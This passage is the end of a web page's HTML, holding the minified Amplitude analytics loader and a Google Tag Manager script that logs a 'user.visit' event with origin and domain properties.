b.onload=function(){e.amplitude.runQueuedFunctions||console.log("[Amplitude] Error: could not load SDK")};a=a.getElementsByTagName("script")[0];a.parentNode.insertBefore(b,a);b=function(){this._q=[];return this};a="add append clearAll prepend set setOnce unset".split(" ");for(var d=0;d<a.length;d++)f(b,a[d]);c.Identify=b;b=function(){this._q=[];return this};a=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"];for(d=0;d<a.length;d++)f(b,a[d]);c.Revenue=b;var h="init logEvent logRevenue setUserId setUserProperties setOptOut setVersionName setDomain setDeviceId setGlobalUserProperties identify clearUserProperties setGroup logRevenueV2 regenerateDeviceId groupIdentify onInit logEventWithTimestamp logEventWithGroups setSessionId resetSessionId".split(" ");
g(c);c.getInstance=function(a){a=(a&&0!==a.length?a:"$default_instance").toLowerCase();c._iq.hasOwnProperty(a)||(c._iq[a]={_q:[]},g(c._iq[a]));return c._iq[a]};e.amplitude=c})(window,document);amplitude.getInstance().init("f602c01f1c06db4f52768e6adaa4eb56",google_tag_manager["GTM-W3ZS73J"].macro(4),{includeUtm:!0,includeGclid:!0,includeReferrer:!0,deviceIdFromUrlParam:!0},function(e){window.amplitudeLoaded=!0});</script><script id="" type="text/javascript">var eventProperties={};eventProperties.origin=google_tag_manager["GTM-W3ZS73J"].macro(5);eventProperties.domain=google_tag_manager["GTM-W3ZS73J"].macro(6);amplitude.getInstance().logEvent("user.visit",eventProperties);</script></body></html>